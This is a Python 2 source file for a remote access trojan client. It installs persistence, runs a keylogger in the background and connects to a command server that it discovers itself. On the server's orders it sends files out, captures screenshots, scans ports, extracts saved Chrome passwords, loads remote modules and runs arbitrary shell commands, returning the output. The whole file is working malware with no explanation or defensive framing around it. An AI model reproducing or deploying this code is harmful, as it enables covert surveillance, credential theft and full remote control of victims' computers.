import os
import subprocess
import time
from PIL import ImageGrab 
import tempfile           
import shutil
import socket
import threading
import pyaudio
import wave
import cv2
import operator 
from collections import OrderedDict

from modules import persistent
from modules import serverdiscovery
from modules import keylog
from modules import scanner
from modules import admincheck
from modules import chrome
from modules import dynmod

###################
#making a copy of it
###################
try:
    persistent.persist()
    print 'step 1 pass'
except:
    print 'step 1 fail'
    pass

##################
#Keylogger will start as the program starts along with clipboard hijacker
##################
path = os.getcwd().strip('/n')
Null,userprof = subprocess.check_output('set USERPROFILE',shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\'  





#################
pathforkey = destination + 'keylog.txt'
kl = keylog.keyLogger(pathforkey)
try:
    threading.Thread(target=kl.run).start()
    print 'keylogger pass'
except Exception,e:
    print 'keylogger failed' + str(e)
    pass    
    
##################
#Transfer module
##################
def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: 
        s.send('Unable to find out the file')
try:
    host = serverdiscovery.sdiscover()
except:
    pass

##################
#Starting a actual client
#First checking the server ip and its status i.e up or down
#Do not initiate connection unless server is conform
##################
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 8080))
    print 'in step 4'
    print 'IP is :' + str(host)
    while True:
        
        if (host != '0.0.0.0') :
            
            command = s.recv(1024)
            if not command:
		pass
	    elif 'terminate' in command:
                s.close()
                break 
            elif 'grab' in command:            
                grab,path = command.split('*')
                try:                          
                    transfer(s,path)
                except Exception,e:
                    s.send ( str(e) )  
                    pass
            elif 'cd' in command:
                code,directory = command.split (' ')
                os.chdir(directory)
                cur_dir = os.getcwd()
                s.send(str(cur_dir))

            elif 'screenshot' in command:
                dirpath = os.getcwd()
                ImageGrab.grab().save(destination + "\img.jpg", "JPEG")
                s.send('ok')
            elif 'admin?' in command:
                result = admincheck.checkadmin()
                s.send(str(result))
            elif 'scan' in command:
                command = command[5:]
                ip,ports = command.split(':')
                scanner.scanner(s,ip,ports)
            elif command == 'chromepass':
                chrome.chromepass()
                s.send('[+]File saved in documents')
			
	    elif 'loadmodule' in command:
                none,name,ip = command.split('*') 
                try:
                    if (dynmod.lodmod(name,ip) == 1):
                        s.send("[+]Module loaded successfully")
                except:
                    s.send("[-]Failed to load module")				
            
	    else:
                 CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 s.send( CMD.stdout.read()) 
                 s.send( CMD.stderr.read())
        

def main ():
    connect()

    
    
main()




        






